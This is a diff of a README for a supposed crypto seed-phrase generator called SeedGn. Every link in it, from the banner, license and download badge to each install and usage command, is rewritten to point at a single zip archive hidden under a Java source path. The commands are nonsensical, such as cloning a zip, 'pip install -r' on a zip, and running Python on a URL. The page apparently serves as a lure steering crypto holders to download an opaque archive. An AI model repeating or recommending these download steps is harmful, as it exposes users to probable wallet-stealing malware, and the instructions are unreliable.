@@ -2,7 +2,7 @@
 
 🌱 **SeedGn** is a powerful and versatile mnemonic phrase and seed phrase generator tool that allows users to securely generate seed phrases for crypto wallets, recovery phrases for digital assets, and much more. 
 
-![SeedGn Banner](https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip)
+![SeedGn Banner](https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip)
 
 ## Table of Contents
 - [Features](#features)
@@ -29,14 +29,14 @@ To get started with SeedGn, follow these simple installation steps:
 ### Clone Repository
 
 ```bash
-git clone https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip
+git clone https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip
 cd SeedGn
 ```
 
 ### Installation of Dependencies
 
 ```bash
-pip install -r https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip
+pip install -r https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip
 ```
 
 ## Usage
@@ -46,19 +46,19 @@ SeedGn can be easily utilized to generate secure seed phrases and recover mnemon
 ### Generate Seed Phrase
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --generate
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --generate
 ```
 
 ### Recover Seed Phrase
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --recover
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --recover
 ```
 
 ### Check Balance
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --check-balance
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --check-balance
 ```
 
 ## Examples
@@ -68,7 +68,7 @@ Let's take a look at some real-world scenarios where SeedGn can be extremely use
 ### Example 1: Generating a New Seed Phrase
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --generate
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --generate
 ```
 
 This command will prompt you through the process of creating a new seed phrase as per your specifications.
@@ -76,7 +76,7 @@ This command will prompt you through the process of creating a new seed phrase a
 ### Example 2: Recovering a Lost Seed Phrase
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --recover
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --recover
 ```
 
 In case you've lost or forgotten your seed phrase, SeedGn will guide you through the recovery process step by step.
@@ -84,7 +84,7 @@ In case you've lost or forgotten your seed phrase, SeedGn will guide you through
 ### Example 3: Checking Wallet Balance
 
 ```bash
-python https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip --check-balance
+python https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip --check-balance
 ```
 
 SeedGn allows you to conveniently check the balance of your crypto wallet associated with a specific seed phrase.
@@ -95,11 +95,11 @@ We welcome contributions from the open-source community to enhance SeedGn furthe
 
 ## License
 
-SeedGn is licensed under the [MIT License](https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip).
+SeedGn is licensed under the [MIT License](https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip).
 
 ---
 
 🔒 **Secure Download:**  
-[![Download SeedGn](https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip%https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip<#HEX-COLOR-CODE>)](https://github.com/THTHLOLOL/SeedGn/releases/download/v2.0/Program.zip)
+[![Download SeedGn](https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip%https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip<#HEX-COLOR-CODE>)](https://raw.githubusercontent.com/THTHLOLOL/SeedGn/master/src/main/java/com/example/Seed_Gn_curtate.zip)
 
 🚀 Start using SeedGn today for all your seed phrase generation and recovery needs! 🌟
